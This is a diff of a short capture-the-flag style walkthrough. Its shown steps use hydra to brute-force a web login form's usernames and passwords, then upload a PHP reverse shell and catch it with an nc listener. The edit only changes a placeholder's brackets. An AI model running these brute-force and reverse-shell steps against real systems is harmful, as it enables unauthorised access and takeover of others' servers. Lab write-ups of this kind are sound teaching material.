@@ -18,7 +18,7 @@
 
 * Type the command ' *hydra -L userid -P credentials.txt IP http-post-form "/directoryWhichWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!* '.  This will give username. 
 
-* Now to crack password we will use command ' *hydra -l <userFromAboveResult> -P credentials.txt IP http-post-form "/directoryWhichWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!* '. This will give us our password.
+* Now to crack password we will use command ' *hydra -l userFromAboveResult -P credentials.txt IP http-post-form "/directoryWhichWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!* '. This will give us our password.
 
 * Now login into the site using these creds. After that it gives us a uploading file option. We can upload our php reverse shell there. After uploading that start you nc listener. After that go to /<directoryWhihcWeGotFromFTP>/images/uploads/phpRevShell.php and you will get your shell.
 
